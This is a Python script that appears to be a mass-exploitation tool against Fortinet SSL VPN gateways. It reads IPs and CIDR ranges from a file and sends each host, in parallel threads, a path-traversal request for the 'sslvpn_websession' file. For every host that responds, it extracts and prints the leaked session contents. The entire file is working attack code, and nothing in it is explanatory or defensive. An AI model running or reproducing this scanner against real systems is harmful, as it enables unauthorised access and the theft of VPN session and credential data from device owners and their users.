import time
from threading import Thread, Lock

import ipcalc
import requests

global result


class MyThread(Thread):
    def __init__(self, threadID, ip):
        Thread.__init__(self)
        self.threadID = threadID
        self.ip = ip

    def run(self):
        print("New ThreadID: ", self.threadID, " ip: ", self.ip)
        tmp = CheckIP(self.ip)
        lock.acquire()
        result.append([self.ip, tmp])
        lock.release()


def CheckIP(ip):
    try:
        url = "https://" + ip + "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
        headers = {"User-Agent": "Mozilla/5.0",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                   "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
                   "Upgrade-Insecure-Requests": "1"}
        r = requests.get(url, headers=headers, verify=False, stream=True, timeout=2)
        img = r.raw.read()
        # print(type(img))
        if "var fgt_lang =" in str(img):
            # print(str(img))
            ret = ''.join(set(str(img).split("x00")))
            time.sleep(2)
            return ret
        else:
            time.sleep(2)
            return "No Vulnerability"
    except:
        time.sleep(2)
        return "Timeout"


def FormatFile(filename):
    target_info = []
    for line in open(filename, 'r'):
        target_check_list = line.strip().split('/')
        if len(target_check_list) == 1:
            target_info_list = line.strip().split(':')
            if len(target_info_list) == 1:
                ip = [target_info_list[0], 443]
                target_info.append(ip)
            elif len(target_info_list) == 2:
                ip = [target_info_list[0], int(target_info_list[1])]
                target_info.append(ip)
        else:
            item = ipcalc.Network(line.strip())
            for i in item:
                ip = [str(i), 443]
                target_info.append(ip)
    print(target_info)
    return target_info


if __name__ == '__main__':
    lock = Lock()
    target = FormatFile('ip.txt')
    result = []
    target_split = []
    for i in range(0, len(target), 5):
        pool = []
        tmp = target[i:i + 5]
        for j in range(0, len(tmp)):
            tmp_ip = tmp[j][0] + ':' + str(tmp[j][1])
            # print("test",type(tmp_ip))
            thread = MyThread(j, tmp_ip)
            thread.start()
            pool.append(thread)
        for single_thread in pool:
            single_thread.join()
    print(result)
